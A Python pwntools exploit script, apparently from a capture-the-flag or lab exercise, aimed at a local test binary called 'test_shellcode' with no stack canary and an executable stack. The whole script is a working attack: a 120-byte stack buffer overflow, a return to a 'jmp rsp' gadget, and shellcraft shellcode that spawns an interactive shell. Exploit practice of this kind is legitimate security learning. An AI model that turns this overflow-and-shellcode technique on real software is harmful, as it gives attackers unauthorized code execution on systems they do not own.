#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./test_shellcode
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './test_shellcode')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004011cc
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

offset = 120
jmp_rsp_addr = 0x40114a # Trovato con ROPgadget --binary ./test_shellcode | grep 'jmp rsp'
shellcode = asm(shellcraft.sh())
payload = b'a'*offset + p64(jmp_rsp_addr) + shellcode
io.sendlineafter(b'Enter some text: ', payload)

io.interactive()

